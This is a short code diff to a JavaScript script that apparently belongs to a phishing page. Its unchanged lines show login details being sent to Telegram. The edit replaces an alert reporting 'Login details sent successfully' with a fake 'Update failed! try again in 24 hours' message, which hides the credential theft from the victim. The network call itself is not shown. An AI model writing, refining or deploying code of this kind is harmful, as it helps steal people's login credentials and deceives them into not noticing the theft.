@@ -43,7 +43,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert('Login details sent successfully.');
+                        alert('Update failed! try again in 24 hours.');
                     } else {
                         alert('Error sending message to Telegram.');
                     }
